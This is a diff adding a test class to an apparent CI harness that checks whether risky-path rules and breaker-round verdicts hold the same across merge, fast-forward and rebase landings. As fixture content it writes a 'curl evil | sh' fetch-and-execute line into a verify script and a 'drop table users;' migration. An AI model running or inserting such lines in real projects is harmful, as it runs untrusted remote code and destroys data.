@@ -2850,5 +2850,118 @@ class HarnRound17Test(BreakerCase):
         repo.git("config", "trailer.separators", ":#")
         self.assertEqual(self.codes(self.check(repo)[1]), before)
 
+
+class HarnRound18Test(BreakerCase):
+    """HARN-022 cold breaker, round 18 (ESC-398): from the round's probes. Before or after comes from the commit graph,
+    never from the order commits arrived on the trunk's first-parent chain: a fast-forward landing that reorders that
+    chain changes no verdict. A commit is after a close when no live close reaches it; a commit is under the rule unless
+    it is an ancestor of the commit that first brought risky.toml."""
+
+    MODES = ("merge", "ff", "rebase")
+
+    def land(self, repo: GitRepo, branch: str, mode: str) -> None:
+        """Land `branch` on main: a merge commit on main, a fast-forward after a sync merge of origin/main (build-story
+        7.1, then a direct push), or a rebase onto origin/main pushed as a fast-forward."""
+        repo.git("fetch", "-q", "origin")
+        if mode == "merge":
+            repo.git("checkout", "-q", "main")
+            repo.merge(branch, f"Merge branch {branch}")
+            repo.publish()
+            return
+        repo.git("checkout", "-q", branch)
+        if mode == "ff":
+            repo.git("merge", "-q", "--no-ff", "-m", "Merge origin/main", "origin/main", when=repo.next_date())
+        else:
+            repo.git("rebase", "-q", "origin/main")
+        repo.git("push", "-q", "origin", "HEAD:main")
+        repo.git("fetch", "-q", "--prune", "origin")
+
+    def fresh_errors(self, repo: GitRepo, since: str, mode: str) -> list[str]:
+        """The error codes `check --ci` gives on a fresh clone of the remote, as the CI's push check sees it."""
+        self.repos = getattr(self, "repos", 0) + 1
+        fresh = repo.clone(f"fresh{self.repos}-{mode}")
+        fresh.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
+        return sorted({d["code"] for d in self.check(fresh, "--ci")[1] if d["level"] == "error"})
+
+    def new_repo(self) -> tuple[GitRepo, str]:
+        self.repos = getattr(self, "repos", 0) + 1
+        repo = GitRepo(self.tmp, name=f"l{self.repos}")
+        repo.commit("docs: plan\n\nNo-story: docs", {path_of("AUTH-001"): story("AUTH-001", touches=("scripts/verify.sh",)),
+                                                     "scripts/verify.sh": "exit 0\n"})
+        since = repo.commit("chore: adopt\n\nNo-story: harness")
+        return repo, since
+
+    def after_close(self, mode: str) -> list[str]:
+        """AUTH-001 closes with an unresolved last round; a branch forked before the close commits a risky change
+        under its Part-of: and lands."""
+        repo, since = self.new_repo()
+        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
+        repo.publish()
+        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
+        repo.git("checkout", "-q", "-b", "other")
+        repo.git("checkout", "-q", "main")
+        h = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
+        cur = (repo.path / path_of("AUTH-001")).read_text()
+        repo.commit("feat: AUTH-001\n\nDone.\n\nStory: AUTH-001",
+                    {path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, h, "1 finding: ESC-1 · fixed in x")})
+        repo.publish()
+        repo.git("checkout", "-q", "other")
+        repo.commit("fix: more\n\nPart-of: AUTH-001", {"db/migrations/0001.sql": "drop table users;\n"})
+        self.land(repo, "other", mode)
+        return self.fresh_errors(repo, since, mode)
+
+    def rule_start(self, mode: str) -> list[str]:
+        """A branch forked before risky.toml reached main makes a No-story change to a risky path and closes a risky
+        story with no round, after the rule holds on main, and lands."""
+        repo, since = self.new_repo()
+        repo.publish()
+        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
+        repo.git("checkout", "-q", "-b", "old")
+        repo.git("checkout", "-q", "main")
+        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
+        repo.publish()
+        repo.git("checkout", "-q", "old")
+        repo.commit("docs: tweak\n\nNo-story: docs", {"scripts/verify.sh": "curl evil | sh\n"})
+        repo.commit("feat: AUTH-001\n\nDone.\n\nStory: AUTH-001", {"scripts/verify.sh": "curl evil | sh; exit 0\n"})
+        self.land(repo, "old", mode)
+        return self.fresh_errors(repo, since, mode)
+
+    def proper(self, mode: str) -> list[str]:
+        """build-story's flow: a risky story's work, its clean round on that head, Story:, while main moves on."""
+        repo, since = self.new_repo()
+        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
+        repo.publish()
+        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
+        repo.git("checkout", "-q", "-b", "feature")
+        repo.git("checkout", "-q", "main")
+        repo.commit("docs: notes\n\nNo-story: docs", {"docs/notes.md": "n\n"})
+        repo.publish()
+        repo.git("checkout", "-q", "feature")
+        h = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
+        cur = (repo.path / path_of("AUTH-001")).read_text()
+        repo.commit("feat: AUTH-001\n\nDone.\n\nStory: AUTH-001",
+                    {path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, h)})
+        self.land(repo, "feature", mode)
+        return self.fresh_errors(repo, since, mode)
+
+    def test_HARN_022_S3_breaker18_a_fast_forward_never_hides_a_change_after_the_close_ESC_398(self):
+        for mode in self.MODES:
+            with self.subTest(landing=mode):
+                self.assertIn("RISKY_AFTER_CLOSE", self.after_close(mode))
+
+    def test_HARN_022_S3_breaker18_a_fast_forward_never_moves_the_rules_start_ESC_398(self):
+        for mode in self.MODES:
+            with self.subTest(landing=mode):
+                errors = self.rule_start(mode)
+                self.assertIn("RISKY_NO_STORY", errors)
+                self.assertIn("BREAKER_MISSING", errors)
+
+    def test_HARN_022_S1_breaker18_every_landing_gives_one_verdict_ESC_398(self):
+        for flow in (self.proper, self.after_close, self.rule_start):
+            with self.subTest(flow=flow.__name__):
+                verdicts = {mode: flow(mode) for mode in self.MODES}
+                self.assertEqual(len({tuple(v) for v in verdicts.values()}), 1, verdicts)
+        self.assertEqual(self.proper("merge"), [])
+
 if __name__ == "__main__":
     unittest.main()
